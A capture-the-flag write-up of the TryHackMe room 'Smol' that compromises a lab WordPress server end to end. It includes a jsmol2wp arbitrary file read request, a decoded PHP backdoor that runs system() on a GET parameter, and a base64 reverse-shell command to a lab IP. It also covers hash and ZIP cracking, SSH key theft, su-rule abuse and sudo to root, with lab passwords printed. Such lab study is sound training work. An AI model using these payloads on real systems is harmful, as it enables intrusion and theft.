---
title: "Smol"
date: 2025-03-18
image: /assets/img/general/CTFgeneral_image.jpg
description: Writeup of the TryHackMe-CTF Smol
categories: [TryHackMe, Medium]
tags: [linux, WordPress, crack, database]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Smol</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Test your enumeration skills on this boot-to-root machine.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Medium</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/smol">https://tryhackme.com/room/smol</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Smol.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap 10.10.241.110 
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-18 06:00 EDT
  Nmap scan report for 10.10.241.110
  Host is up (0.038s latency).
  Not shown: 998 closed tcp ports (conn-refused)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http

  Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A 10.10.241.110
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-18 06:00 EDT
  Nmap scan report for 10.10.241.110
  Host is up (0.040s latency).
  Not shown: 998 closed tcp ports (conn-refused)
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
  |   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
  |_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
  80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
  |_http-title: Did not follow redirect to http://www.smol.thm
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 8.65 seconds
```
From here I proceeded the analysis port by port.

## Port 80 Analysis

The webserver redirected me to `http://www.smol.thm/`, so I added the domain to my hosts file. After that, I was able to access the website, which displayed a CTF site describing several vulnerabilities. I initiated a Gobuster directory enumeration while performing some manual enumeration in parallel. During this process, I discovered potential usernames and identified WordPress as the underlying CMS:
```text
Usernames:
  Jose Mario Llado Marti
  wordpress user
  admin@smol.thm
Software:
  Proudly powered by WordPress
```

```bash
$ gobuster dir --url http://www.smol.thm --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://www.smol.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 317] [--> http://www.smol.thm/wp-content/]
/wp-includes          (Status: 301) [Size: 318] [--> http://www.smol.thm/wp-includes/]
/wp-admin             (Status: 301) [Size: 315] [--> http://www.smol.thm/wp-admin/]
/server-status        (Status: 403) [Size: 277]
Progress: 207643 / 207644 (100.00%)
===============================================================
Finished
===============================================================
```

By manual searching for the WordPress login page, I succeeded:

![WordPress login](/assets/img/tryhackme/Smol/thm_smol_1.jpg)

Since I had discoverd a WordPress instance, I analyzed it using `wpscan`:
```bash
$ wpscan --url http://www.smol.thm/            
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://www.smol.thm/ [10.10.241.110]
[+] Started: Tue Mar 18 06:17:12 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://www.smol.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://www.smol.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://www.smol.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://www.smol.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

Fingerprinting the version - Time: 00:00:28 <==================================================================================================> (702 / 702) 100.00% Time: 00:00:28
[i] The WordPress version could not be detected.

[+] WordPress theme in use: twentytwentythree
 | Location: http://www.smol.thm/wp-content/themes/twentytwentythree/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://www.smol.thm/wp-content/themes/twentytwentythree/readme.txt
 | [!] The version is out of date, the latest version is 1.6
 | [!] Directory listing is enabled
 | Style URL: http://www.smol.thm/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://www.smol.thm/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <====================================================================================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Mar 18 06:17:47 2025
[+] Requests Done: 1444
[+] Cached Requests: 7
[+] Data Sent: 389.28 KB
[+] Data Received: 29.706 MB
[+] Memory used: 273.461 MB
[+] Elapsed time: 00:00:35
```

Two sections of the `wpscan` output caught my attention:

### Theme twentytwentythree Analysis

After researching the `twentytwentythree` theme, I found no exploit or misconfiguration that I could exploit.
```bash
[+] WordPress theme in use: twentytwentythree
 | Location: http://www.smol.thm/wp-content/themes/twentytwentythree/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://www.smol.thm/wp-content/themes/twentytwentythree/readme.txt
 | [!] The version is out of date, the latest version is 1.6
 | [!] Directory listing is enabled
 | Style URL: http://www.smol.thm/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://www.smol.thm/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.2'
```

### Plugin jsmol2wp Analysis 

The `wpscan` output clearly identified the `jsmol2wp` plugin:
```bash
[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
```

Upon further investigation, I found a vulnerability on <a href="https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt">GitHub</a>. This plugin has two CVEs: CVE-2018-20463 and CVE-2018-20462, which are arbitrary file read and XSS vulnerabilities, respectively. I attempted to exploit the arbitrary file read vulnerability and successfully retrieved `/etc/passwd`:

![Arbitrary File Read](/assets/img/tryhackme/Smol/thm_smol_2.jpg)

Since I could read arbitrary files and had obtained usernames, I tried to discover SSH keys and bash histories, but wasn't successful. However, I did discover the `wp-config.php` file, which contained the database credentials:
```php
[...]
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );
[...]
```

Using these credentials, I successfully logged into the WordPress instance:

![WordPress Login](/assets/img/tryhackme/Smol/thm_smol_3.jpg)

## Shell as www-data

While enumerating the website, I found an unpublished page. This page contained tasks for the webmaster, some of which sounded interesting:

![Webmaster Tasks](/assets/img/tryhackme/Smol/thm_smol_4.jpg)

I researched the "Hello Dolly" plugin and found its <a href="https://github.com/WordPress/hello-dolly">GitHub</a> page. The plugin includes a file called `hello.php`, which seemed worth investigating. Since I could read arbitrary files on the system, I searched for the file and found it:

```bash
$ curl -X GET "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php"
```

One section of the script caught my attention:
```php
// This just echoes the chosen line, we'll position it later.
function hello_dolly() {
	eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
```

I analyzed the Base64-encoded string and discoverd the following code:
```bash
$ echo "CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=" | base64 -d

 if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }
```

For decoding, I used Copilot to break it down and received a clear explanation:

![Copilot Output](/assets/img/tryhackme/Smol/thm_smol_5.jpg)

With this information, I attempted to gain a reverse shell. According to the Hello Dolly plugin description, the quotes it displays are shown on the admin main page. This suggests that the function is likely imported by the admin dashboard's `index.php` file:
```html
http://www.smol.thm/wp-admin/index.php?cmd=echo -n c2V0c2lkIGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTAuMTAvOTAwMSAwPiYxICYK|base64 -d|bash

```

Great! I had identified an initial access vector and used it to began privileges escalation.

## Privilege Escalation diego

Using the previously discovered data base credentials, I successfully logged into the MySQL database. I found user password hashes and attempted to crack them using `john`. I successfully cracked  Diego's hash, switched to the Diego user, and retrieved the user flag:
```bash
www-data@smol:/var/www/wordpress/wp-admin$ mysql -u wpuser -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 17411
Server version: 8.0.36-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

![Database Access](/assets/img/tryhackme/Smol/thm_smol_6.jpg)

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 512/512 AVX512BW 16x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sandiegocalifornia (?)     
1g 0:00:00:07 DONE (2025-03-18 07:59) 0.1335g/s 175953p/s 175953c/s 175953C/s sandr1ta..sammyak
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.

diego@smol:/var/www/wordpress/wp-admin$ cd /home/diego/
diego@smol:~$ cat user.txt 
  [removed]
```

## Privilege Escalation think

Next, I searched for files owned by the user think and discovered SSH keys:
```bash
diego@smol:~$ find / -user think -type f 2>/dev/null
/home/think/.profile
/home/think/.bashrc
/home/think/.bash_logout
/home/think/.ssh/id_rsa
/home/think/.ssh/authorized_keys
/home/think/.ssh/id_rsa.pub
```

After copying the private `id_rsa` key to my machine, I was able to log in using it:
```bash
$ nano id_rsa
$ chmod 600 id_rsa
$ ssh -i id_rsa think@10.10.241.110
think@smol:~$
  uid=1000(think) gid=1000(think) groups=1000(think),1004(dev),1005(internal)
```

## Privilege Escalation gege

I checked `/etc/pam.d/su` and discoverd that I was allowed to switch the user "gege" if I was logged in as "think".
```bash
think@smol:/home/gege$ cat /etc/pam.d/su | grep -v '#'
  [...]
  auth  [success=ignore default=1] pam_succeed_if.so user = gege
  auth  sufficient                 pam_succeed_if.so use_uid user = think
  [...]
think@smol:/home/gege$ su gege
gege@smol:~$ id
  uid=1003(gege) gid=1003(gege) groups=1003(gege),1004(dev),1005(internal)
```

## Privilege Escalation xavi

In Gege's home directory, I found a ZIP archive. After downloading it to my local machine, I successfully cracked the password and accessed the files:
```bash
$ zip2john wordpress.old.zip
$ nano ziphash
$ john --wordlist=/usr/share/wordlists/rockyou.txt ziphash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hero_gege@hotmail.com (wordpress.old.zip)     
1g 0:00:00:00 DONE (2025-03-18 08:30) 1.724g/s 13163Kp/s 13163Kc/s 13163KC/s hesse..hellome2010
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
$ unzip wordpress.old.zip
Archive:  wordpress.old.zip
   creating: wordpress.old/
[wordpress.old.zip] wordpress.old/wp-config.php password:
[...]
```

Upon inspecting the files, I found the `wp-config.php`, which contained Xavi's password:
```bash
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'xavi' );

/** Database password */
define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );
```

With this password, I was able to switch to the Xavi user:
```bash
xavi@smol:/home/gege$ id
  uid=1001(xavi) gid=1001(xavi) groups=1001(xavi),1005(internal)
```

## Privilege Escalation root
I started by running `sudo -l`, which revealed that Xavi had full sudo privileges:
```bash
xavi@smol:/home/gege$ sudo -l
  [sudo] password for xavi: 
  Matching Defaults entries for xavi on smol:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User xavi may run the following commands on smol:
      (ALL : ALL) ALL
```
Using this, I was able to retrieve the root flag:
```bash
xavi@smol:/home/gege$ sudo cat /root/root.txt
  bf89ea3ea01992353aef1f576214d4e4
xavi@smol:/home/gege$ sudo su 
root@smol:/home/gege$ id 
  uid=0(root) gid=0(root) groups=0(root)
```

solved! :)